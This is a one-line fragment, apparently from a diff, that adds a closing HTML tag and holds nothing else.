+   </html>
